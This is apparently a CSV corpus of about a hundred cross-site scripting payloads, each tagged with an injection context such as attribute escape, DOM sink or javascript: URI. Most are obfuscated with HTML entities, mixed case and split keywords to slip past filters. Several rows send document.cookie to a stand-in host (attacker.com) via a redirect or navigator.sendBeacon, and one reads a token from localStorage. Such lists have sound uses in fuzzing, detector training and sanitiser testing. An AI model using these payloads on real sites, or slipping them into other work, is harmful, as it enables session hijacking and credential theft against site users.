payload,context
""" ontr&#97;nsition&#101;nd=&#97;l&#101;rt(1) """,attribute_escape
"'><img src=x onh&#97;shch&#97;ng&#101;=confirm(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
%27 onselect=prompt(1) %27,attribute_escape
<scr	ipt>/*/alert(1)</scr	ipt>,script_injection
\' ontouchmove=confirm(document.domain)//,attribute_escape
""" onend=prompt(location.hash) """,attribute_escape
\%22 onfocus=alert(1)//,attribute_escape
"Obj&#101;ct.&#97;ssign(window,{""onst&#97;ll&#101;d"":XMLHttpR&#101;qu&#101;st})",dom_sink
"LocAtiOn.HreF=""JavAscRipT:aLerT('//aTtaCkeR.cOm/?c='+dOcuMenT.cOokIe)""",dom_sink
JAVASCRIPT:console.log(document.domain),js_uri
&quOt; onBefOreMatCh=ConFirM(1) x=&qUot;,attribute_escape
 onmous&#101;ov&#101;r=confirm(1),event_handler
\' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)//,attribute_escape
#alert(1),template_injection
%22 ><svg onbeforepaste=alert(%27XSS%27)>,attribute_escape
"'%3E%3Cscript%3Eprompt(String.fromCharCode(88,83,83))%3C/script%3E",script_injection
"&quOt; onLoaD=aLerT(STriNg.FroMChArCOde(88,83,83)) X=&QuoT;",attribute_escape
OnpAgeShoW=aLerT/*X*/('XSS'),event_handler
' onpoint&#101;rdown=consol&#101;.log(docum&#101;nt.dom&#97;in) ',attribute_escape
"<select
onvolumechange=console.log(1)>",tag_injection
%3C!--%3E%3Caudio onplay=console.log(1)%3E,tag_injection
"\' onanimationiteration=alert(String.fromCharCode(88,83,83))//",attribute_escape
"JavA
sCriPt:ConSolE.lOg(1)",js_uri
&quot; ongotpointercapture=console.log(document.domain) x=&quot;,attribute_escape
__proto__[%22onerror%22]=alert(%27//attacker.com/?c=%27+document.cookie),dom_sink
"<scRipT
>AleRt(StrIng.frOmCHarCodE(88,83,83))</sCriPt>",script_injection
"\"" OnkEydOwn=alErt(loCatIon.haSh)//",attribute_escape
"ObjEct.asSigN(wIndOw,{""oNanImaTioNenD"":ConSolE.lOg})",dom_sink
ontouchmov&#101;=prompt&#40;docum&#101;nt.dom&#97;in&#41;,event_handler
"""><img src=x onc&#97;npl&#97;y=prompt(docum&#101;nt.dom&#97;in)>",attribute_escape
"(neW FUncTioN(""XMLHttPReQueSt(NavIgaTor.seNdBEacOn('//AttAckEr.Com',dOcuMenT.cOokIe))""))();",dom_sink
<script>console.log(1)</script>,script_injection
ons&#101;&#97;rch=consol&#101;.log&#40;'XSS'&#41;,event_handler
"document.body.innerHTML=%22<img src=x onerror=XMLHttpRequest(String.fromCharCode(88,83,83))>%22",dom_sink
onfocusout=alert('XSS'),event_handler
j&#97;v&#97;script:confirm(1),js_uri
ondragover=confirm(%27XSS%27),event_handler
"\"" onauxclick=prompt(location.hash)//",attribute_escape
{% confirm document.domain %},template_injection
on&#97;uxclick=prompt/**/(1),event_handler
"%3Cbase ontouchmove=console.log(String.fromCharCode(88,83,83)) ontouchmove=console.log(String.fromCharCode(88,83,83))%3E",tag_injection
onsubmit=\u0061lert/**/(location.hash),event_handler
\' onclos&#101;=consol&#101;.log(loc&#97;tion.h&#97;sh)//,attribute_escape
"${{'alErt(doCumEnt.doMaiN)'.rePlaCe('alErt(doCumEnt.doMaiN)','')}}",template_injection
"DocUmeNt.QueRySEleCtoR(""BodY"").inNerHTML+=""prOmpT(lOcaTioN.hAsh)""",dom_sink
 onTraNsiTioNstArt=coNsoLe.Log('XSS'),event_handler
"\%22 onwaiting=prompt(String.fromCharCode(88,83,83))//",attribute_escape
"`%3E%3Cimg src=x onmouseup=prompt(String.fromCharCode(88,83,83))%3E",attribute_escape
%27><img src=x onend=confirm(%27XSS%27)>,attribute_escape
"'><img src=x onp&#97;g&#101;sw&#97;p=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))>",attribute_escape
" onBefOreTogGle=prOmpT(STriNg.FroMChArCOde(88,83,83))",event_handler
onpageshow=confirm(location.hash),event_handler
"ObjEct.asSigN(wIndOw,{""oNcoPy"":feTch})",dom_sink
&quOt; onSeaRch=alErt('XSS') x=&qUot;,attribute_escape
"<td
onStaLleD=cOnfIrm('XSS')>",tag_injection
\' onw&#101;bkit&#97;nim&#97;tion&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)//,attribute_escape
"element.insertAdjacentHTML(""beforeend"",""%3Cimg src=x onerror=console.log(localStorage.getItem('token'))%3E"")",dom_sink
'><img src=x ontransitionstart=confirm(document.domain)>,attribute_escape
 onFocUs=AleRt(LocAtiOn.HasH),event_handler
%3Cscript%3E/x/console.log(document.domain)%3C/script%3E,script_injection
"%3Canimate
onfocus=console.log(document.domain)%3E",tag_injection
"__pRotO__[""oNcaNplAy""]=XMLHTtpReqUesT('XSS')",dom_sink
' onb&#101;for&#101;cut=&#97;l&#101;rt(docum&#101;nt.dom&#97;in) ',attribute_escape
"<script>&#97;l&#101;rt`String.fromCh&#97;rCod&#101;(88,83,83)`</script>",script_injection
"Obj&#101;ct.&#97;ssign(window,{""ontouch&#101;nd"":prompt})",dom_sink
"%3Cblink onpagehide=confirm(String.fromCharCode(88,83,83))%3E",tag_injection
<a Src=x OnbEfoRemAtcH=pRomPt(DocUmeNt.DomAin)>,tag_injection
"<script>console.log`String.fromCharCode(88,83,83)`</script>",script_injection
"""%3E%3Cimg src=x oncut=confirm('XSS')%3E",attribute_escape
"`%3E%3Cimg src=x onended=alert(String.fromCharCode(88,83,83))%3E",attribute_escape
%27><img src=x onwebkitanimationend=prompt(1)>,attribute_escape
"""><Tr OntRanSitIonEnd=prOmpT(STriNg.FroMChArCOde(88,83,83))>",tag_injection
<base onpointerup=\u0061lert(location.hash) onpointerup=\u0061lert(location.hash)>,tag_injection
<mtext src=x onstalled=console.log(document.domain)>,tag_injection
<noScrIpt srC=x onBefOreMatCh=ConSolE.lOg('XSS')>,tag_injection
""" oNdbLclIck=coNsoLe.Log('XSS') """,attribute_escape
' %3E%3Csvg onmozfullscreenchange=alert(1)%3E,attribute_escape
""" oNfoCus=coNfiRm(LocAtiOn.HasH) AutOfoCus=""",attribute_escape
j&#97;vascript:\u0061lert(1),js_uri
%3C!--%3E%3Cblink onpopstate=console.log(document.domain)%3E,tag_injection
%3Cset onfocus=prompt(document.domain)/%3E,tag_injection
%3Cxmp ontransitionend=alert(location.hash)/%3E,tag_injection
\' OnbEfoReiNpuT=cOnsOle.loG(dOcuMenT.dOmaIn)//,attribute_escape
JavA	sCriPt:AleRt(DocUmeNt.DomAin),js_uri
'><img src=x ong&#101;stur&#101;&#101;nd=confirm(loc&#97;tion.h&#97;sh)>,attribute_escape
OnkEypResS=pRomPt&#40;1&#41;,event_handler
javascr	ipt:void(prompt('XSS')),js_uri
"java	scr	ipt:confirm(String.fromCharCode(88,83,83))",js_uri
onmouseenter=prompt/**/(1),event_handler
"Object.assign(window,{""onauxclick"":confirm})",dom_sink
"ObjEct.asSigN(wIndOw,{""oNseCurItyPolIcyVioLatIon"":eVal})",dom_sink
"%3Cscript%3EsetTimeout('console.log(location.hash)',0)%3C/script%3E",script_injection
' ><svg onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,attribute_escape
"\"" OnmOusEwhEel=coNsoLe.Log(1)//",attribute_escape
	onPagEhiDe=ConFirM(lOcaTioN.hAsh),event_handler
"%3Canimate
onpageshow=console.log('XSS')%3E",tag_injection
""" ons&#101;&#97;rch=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape
<span onbeforetoggle=prompt(location.hash)>,tag_injection
""" oNdrAgsTarT=cOnfIrm(1) """,attribute_escape
